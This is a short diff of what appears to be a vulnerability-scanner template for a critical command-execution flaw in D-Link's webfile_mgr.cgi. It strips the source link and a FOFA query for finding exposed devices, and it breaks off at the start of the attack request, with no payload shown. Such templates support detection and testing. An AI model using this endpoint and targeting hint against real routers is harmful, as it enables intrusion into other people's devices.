@@ -3,12 +3,8 @@ info:
   name: D-Link webfile_mgr.cgi存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lyu2hq7xe7yaqqfn'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lyu2hq7xe7yaqqfn
-    fofa: '"D-Link-DIR"'
 http:
 - raw:
   - 'POST /cgi-bin/webfile_mgr.cgi HTTP/1.1
